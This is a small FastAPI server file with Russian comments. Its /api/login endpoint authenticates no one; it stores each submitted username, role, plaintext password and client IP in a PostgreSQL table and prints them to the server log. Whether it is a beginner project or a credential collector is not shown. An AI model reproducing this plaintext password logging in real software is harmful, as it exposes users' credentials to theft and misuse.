from fastapi import FastAPI
from pydantic import BaseModel
import psycopg2
import os
from datetime import datetime
from typing import Optional

app = FastAPI()

# Получаем ссылку на базу данных Neon из настроек облака Render
DATABASE_URL = os.environ.get("DATABASE_URL")

def get_db_connection():
    """Функция для быстрого подключения к облачной PostgreSQL"""
    return psycopg2.connect(DATABASE_URL)

def init_db():
    """Функция, которая создает таблицу в облачной базе данных, если её нет"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Создаем таблицу для логов входа (для Postgres используем SERIAL вместо AUTOINCREMENT)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_logs (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            role TEXT NOT NULL,
            password TEXT,
            client_ip TEXT,
            login_time TEXT NOT NULL
        )
    """)
    conn.commit()
    cursor.close()
    conn.close()
    print("[POSTGRES INFO] База данных проверена, таблица user_logs готова!")

# Запускаем создание/проверку таблицы в облаке при старте сервера
if DATABASE_URL:
    init_db()
else:
    print("[ERROR] Переменная окружения DATABASE_URL не найдена!")

class LoginData(BaseModel):
    username: str
    role: str
    password: str = ""       # Поле для пароля
    client_ip: Optional[str] = "Не указан"  # Принимаем IP-адрес, отправленный клиентом

@app.get("/")
def read_root():
    return {"status": "Server is running", "db": "PostgreSQL (Neon) connected"}

@app.post("/api/login")
def login_user(data: LoginData):
    # Получаем текущее время
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Записываем данные в облачную PostgreSQL базу данных
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # В Postgres вместо знаков "?" используются "%s"
    cursor.execute(
        "INSERT INTO user_logs (username, role, password, client_ip, login_time) VALUES (%s, %s, %s, %s, %s)",
        (data.username, data.role, data.password, data.client_ip, current_time)
    )
    conn.commit()
    cursor.close()
    conn.close()

    print(f"\n[SERVER LOG] Получен запрос от {data.username} ({data.role})")
    print(f"[IP LOG] Адрес клиента: {data.client_ip}")
    print(f"[NEON DB LOG] Данные успешно сохранены в облачную БД!")
    
    return {"status": "success", "saved_to_db": True}